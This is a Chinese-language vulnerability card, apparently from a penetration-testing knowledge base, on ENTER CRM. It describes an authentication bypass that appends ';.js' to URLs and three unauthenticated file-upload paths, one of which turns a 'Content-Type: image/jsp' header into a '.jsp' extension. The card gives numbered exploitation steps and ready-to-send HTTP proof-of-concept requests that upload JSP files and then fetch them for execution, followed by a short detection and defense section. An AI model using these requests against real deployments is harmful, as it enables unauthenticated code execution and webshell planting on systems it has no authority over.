---
id: web-generic-file-upload-enter-crm-fileupload-mailaction-semicolon-bypass
title: 恩特客户资源管理系统（ENTER CRM）文件上传三入口：fileupload.jsp 裸流写文件、MailAction saveAttaFile/AppUpload 与 ;.js 后缀黑名单鉴权绕过
type: scenario
domain: web
path: web/generic/file-upload
technique: enter-crm-fileupload-mailaction-semicolon-auth-bypass
aliases:
- 恩特CRM 任意文件上传
- entsoft fileupload.jsp
- MailAction.entphone 上传
- act=saveAttaFile
- act=AppUpload
- image/jsp 后缀上传
- PurFilter 鉴权绕过
- ;.js 绕过登录
- EntPhone Filter
tags:
- web
- java
- file-upload
- auth-bypass
- servlet-filter
- semicolon
- content-type
- jsp
- webshell
- crm
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V647
  verified_at: '2026-11-13T03:54:41+08:00'
  notes: 已对照原文与18张截图核对：图2/11 fileupload.jsp 裸流写 Entsoft/enterdoc.war/uploadfile/ 并回显 /enterdoc/uploadfile/；图5-6 PurFilter（common.jar）与 web.xml /* 注册、listExptFilTyp=.gif/.bmp/.js/.jpg/.css/.html/.cab/.png/.swf/.ico、listExptUrl 含两端 fileupload.jsp；图7 contains 判断；图8-9 ;.html/;.jpg 返回 404 而非 302；图12-14 *.entphone 映射 entphone.EntPhoneControl 与 MailAction execute 分发；图15 saveAttaFile item.getName()+%→%25；图16-17 AppUpload image/jsp→.jsp，200 响应 path D:/Entsoft/enterdoc.war/EnterMail/20231119/1/ AttName 1214208.jsp；图18 访问 JSP 执行。核对中修正卡片三处：1) enterdoC.war 统一改为截图中的 enterdoc.war（6 处）；2) PurFilter 条件句原来误把“URL 含 entphone”写成 session 校验前提，按图7代码改为“会话无 usr_id、URL 不在 listExptUrl、后缀不在 listExptFilTyp 时进入校验”；3) AppUpload 补充 video/quicktime→.mov 分支，纠正“仅要求 image”的过窄表述。原文未写产品版本/受影响区间，affected_versions 留空正确。dedup 首条为草稿自身；MetaCRM softlogo/sendsms/sendfile 等均为不同产品端点，非同链，dup-scan 无涉及 pair。未复跑 PoC。
---

# 一句话结论

恩特客户资源管理系统（ENTER CRM）存在多条任意文件上传链：`/entsoft_en/entereditor/jsp/fileupload.jsp?filename=1.jsp` 把请求体原样写入 `enterdoc.war/uploadfile/` 下可访问目录；`MailAction.entphone` 的 `saveAttaFile` 直接使用 multipart 原始文件名、不校验后缀；`AppUpload` 要求 Content-Type 含 `image`（另有 `video/quicktime` 分支）并把其子类型当扩展名（`image/jsp` → `.jsp`）。受登录保护的 `*.entphone` 动作可用 `;.js`/`;.png` 路径参数让 PurFilter 把请求当作静态资源跳过鉴权，形成未登录 getshell。

# 原理

- **Filter 白名单里的上传点**：`web.xml` 注册 `filter.PurFilter` 映射 `/*`。该过滤器维护 `listExptUrl`（免鉴权 URL，含 `/entsoft/entereditor/jsp/fileupload.jsp`、`/entsoft_en/entereditor/jsp/fileupload.jsp`、`/services/entsoftInterface`、登录类 Action 等）与 `listExptFilTyp`（免鉴权后缀，含 `.gif/.bmp/.js/.jpg/.css/.html/.cab/.png/.swf/.ico`）。当会话无 `usr_id`、URL 不在 `listExptUrl`、且后缀不在 `listExptFilTyp` 时进入 session 登录校验；任一条件不满足（如后缀命中 `.js`）即直接放行。
- **`;.js` 绕过**：`PurFilter` 按原始 URL 字符串取"后缀"判断，而 Tomcat 会把 `;...` 当作路径参数剥离后再做 Servlet 映射。请求 `/entsoft/MailAction.entphone;.js` 对过滤器看起来后缀是 `.js`（命中免鉴权后缀），对 Tomcat 则等价于 `/entsoft/MailAction.entphone`，命中 `*.entphone` 的 `entPhone` Servlet（`enterphone.EntPhoneControl`），于是未登录即可调用 `MailAction` 的各个 `act`。
- **入口 1：fileupload.jsp 裸流写文件**：JSP 中 `InputStream fis = request.getInputStream(); String filename = request.getParameter("filename"); FileOutputStream fos = new FileOutputStream(EntAsp.getEntsoftPath("") + "Entsoft/enterdoc.war/uploadfile/" + filename, true);` 直接把请求体拷贝到 `enterdoc.war/uploadfile/`，并回显 `/enterdoc/uploadfile/<filename>`；`entsoft` 版本只对以 `.jpg` 结尾的名字追加 `.jpeg`，对 `1.jsp` 不生效。因为该 JSP 位于 `listExptUrl`，无需登录。
- **入口 2：MailAction.saveAttaFile**：`EntPhoneControl` 按 `method`/`act` 分发，`act=saveAttaFile` 进入 `saveAttaFile()`；方法取 `item.getName()` 作为 `fileName`（只做 `%`→`%25` 替换），拼到 `Entsoft/enterdoc.war/EnterMail/<yyyyMMdd>/<bodyID>/`，完全没有后缀黑名单/白名单，可写入 `.jsp`。
- **入口 3：MailAction.AppUpload 用 Content-Type 当后缀**：`contentType = item.getContentType().toLowerCase();` 先校验 `contentType.indexOf("image") != -1`（若不匹配但含 `video/quicktime` 则拼 `.mov`），随后 `fileName += "." + contentType.substring(contentType.indexOf("/") + 1);`。因此 `Content-Type: image/jsp` 得到 `.jsp`，`image/x-icon` 得到 `.x-icon`；文件写到同一 `enterdoc.war/EnterMail/` 目录，响应返回可访问路径，访问即由容器解析执行。
- **为什么危害是 getshell**：上传目录位于 `enterdoc.war` 应用（URL 前缀 `/enterdoc`）下且对外可访问，Tomcat 会编译执行其中的 `.jsp`；攻击者未登录即可通过 `;.js` 绕过 + 上传 JSP 拿 webshell。

# 触发条件

- 目标为恩特客户资源管理系统，部署路径含 `/entsoft`（`entsoft.war`）与 `/enterdoc`（`enterdoc.war`），Tomcat/JBoss 支持 `;` 路径参数。
- `fileupload.jsp` 未被删除/修补，或 `MailAction` 的 `saveAttaFile`/`AppUpload` 可经 `;.js` 未登录访问。
- 上传目录可写且 Web 可访问；`PurFilter` 仍按后缀子串判断免鉴权（未改为精确路径匹配）。
- `AppUpload` 需要 multipart part 的 Content-Type 可控（客户端可任意设置）。

# 利用步骤

1. 未登录验证 `fileupload.jsp`：向 `/entsoft_en/entereditor/jsp/fileupload.jsp?filename=1.jsp` POST JSP 代码，响应回显 `/enterdoc/uploadfile/1.jsp`，访问确认执行。若已修补，转入口 2/3。
2. 验证 `;` 绕过：对受保护动作追加后缀，如 `/entsoft/MailAction.entphone;.js` 或 `;.png`；若不再 302 登录而是进入业务逻辑（200/参数错误），说明 Filter 被绕过。
3. `saveAttaFile` 上传：构造 multipart，`filename="beautif.jsp"`（或 `.js`），POST 到 `/entsoft/MailAction.entphone;.png?act=saveAttaFile`，从响应 `path`/`visitPath` 取落点，访问执行。
4. `AppUpload` 上传：multipart part 设 `Content-Type: image/jsp`，`filename="1.png"`，body 为 JSP 代码，POST 到 `/entsoft/MailAction.entphone;.js?act=AppUpload&bodyID=1`；响应 `AttName` 为 `...jsp`，按 `/enterdoc/EnterMail/<日期>/<bodyID>/<AttName>` 访问。
5. 横向检查其他 Action（如 `CustomerAction.entphone?method=loadFile`）是否同样存在上传/任意文件读写；测试结束后清理上传文件。

# PoC

```http
POST /entsoft_en/entereditor/jsp/fileupload.jsp?filename=1.jsp HTTP/1.1
Host: target
Content-Length: 27

<%= (new java.util.Date()).toLocaleString()%>
```

```http
POST /entsoft/MailAction.entphone;.png?act=saveAttaFile HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Length: 179

------WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Disposition: form-data; name="file";filename="beautif.jsp"
Content-Type: xxx/txt

<%= (new java.util.Date()).toLocaleString()%>
------WebKitFormBoundarye8FPHsIAq9JN8j2A--
```

```http
POST /entsoft/MailAction.entphone;.js?act=AppUpload&bodyID=1 HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=---------------------------255059884712683317431739889351
Content-Length: 259

-----------------------------255059884712683317431739889351
Content-Disposition: form-data; name="file"; filename="1.png"
Content-Type: image/jsp

<%= (new java.util.Date()).toLocaleString()%>
-----------------------------255059884712683317431739889351--
```

```text
# 响应中 AttName/path 示例：D:/Entsoft/enterdoc.war/EnterMail/20231119/1/，AttName: 1214208.jsp
GET /enterdoc/EnterMail/20231119/1/1214208.jsp HTTP/1.1
```

# 变体与关联

- 后缀变体：`;.js`、`;.png`、`;.jpg`、`;.html` 等命中免鉴权后缀均可尝试；不同容器对 `;` 参数剥离行为略有差异。
- 路径穿越变体：`/可访问路径/../受保护路径` 让 Filter 看到可访问前缀、容器归一化后到受保护接口。
- 同类通用卡：[[web-generic-auth-oa-downloadfilter-protectfilter-path-substring-bypass]]（路径子串白名单 + `;common.js`）、[[web-generic-auth-oa-jsf-sessionfilter-loginjsf-semicolon-bypass]]（`;login.jsf`）、[[web-java-component-tomcat-semicolon-path-param-access-bypass]]（Tomcat 分号路径参数）；本卡差异在产品具体端点与三个上传实现。
- 上传变体关联：[[web-generic-file-upload-content-type-trust-bypass]]（只信 Content-Type 白名单）、[[web-generic-file-upload-base64-data-uri-extension-jsp]]（data URI 的 MIME 子类型作后缀）；本卡是 multipart Content-Type 子类型作后缀。
- 其他 Action：`CustomerAction.entphone?method=loadFile` 等同类 EntPhone 动作也可能存在任意文件读/上传，提示该系统整体为"通杀型"。

# 检测与防御

- 检测：访问日志中出现 `;.js`、`;.png` 等带分号路径参数访问 `*.entphone`/JSP；同一 IP 先请求 `fileupload.jsp`/`MailAction.entphone` 再 GET 上传目录中的 `.jsp`；上传目录新增脚本文件；`fileupload.jsp` 被外部访问。
- 防御：升级到修复版本；删除/禁用 `fileupload.jsp` 等测试上传接口；Filter 改为精确路径/后缀白名单并先对 URI 做规范化（拒绝 `;` 或统一解码后再判断）；上传目录禁止脚本执行（Tomcat 侧移除 JSP Servlet 映射或用独立静态域）；上传文件名服务端重命名并做扩展名白名单 + 内容检测；前置 WAF/代理拒绝带 `;` 的路径或按规范化路径转发。
